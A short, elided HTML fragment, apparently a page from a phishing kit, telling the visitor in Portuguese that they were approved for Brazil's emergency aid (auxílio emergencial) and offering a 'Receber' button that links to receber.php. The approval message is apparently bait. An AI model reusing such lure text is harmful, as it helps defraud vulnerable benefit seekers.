...
<body>
	...
	<div class="form">
		<p id="aprovado"> Voce foi aprovado no auxilio emergencial. Clique no botão abaixo para receber.</p>
		<a href="receber.php"><button type="submit" style="color:yellow;">Receber</button>
	</div>
